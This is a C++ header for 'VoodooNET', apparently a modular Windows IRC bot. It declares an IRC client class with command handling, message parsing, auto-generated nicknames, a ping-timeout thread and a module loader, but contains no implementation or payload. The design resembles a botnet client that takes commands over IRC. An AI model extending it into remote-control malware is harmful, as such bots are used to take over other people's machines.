/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#pragma once

#ifndef __CIRC_H__
#define __CIRC_H__
#define IRCLINE 200
#define MAX_NICKLEN 21
#define MAX_DATA_SIZE 4096
#define FLOOD_DELAY 10


#include "cCommands.h"
#include "cString.h"
//#include "config.h"

DWORD WINAPI PingTimeoutThread(LPVOID param);


typedef struct voodoo_net
{
	char* cNickName;
	char* cIdent;
	char* cHostname;
	char* cTarget;
	char* cCmd;
	char* cParams;
} voodoo_inet;


class CMessage
{
public:
		cString		sSrc;
		cString		sIdentd;
		cString		cHost;
		cString		sDest;
		cString		sCmd;
		cString		sParameters;

};
class cIRC : public cCommandHandler
{
public:
	cIRC();
	void Init();
	int start();
	int Quit();
	bool HandleCommand(char* cmd, char* params, ...);
	void SplitRecv(char* data);
	bool ParseRecv(char* data);
	int isend(int socket, const char* data, ...);
	int sendmsg(const char* msg, ...);
	bool newmsg(const char* szMsg, ...);
	bool prefix;
	bool bConnected;
	char* NickCreate();
	command m_cmdIRCSendMessage, m_cmdIRCQuit, m_cmdIRCNickChange;
	int m_socket;

	moduload	m_cIRCModule;
//	string channel;
protected:
};
#endif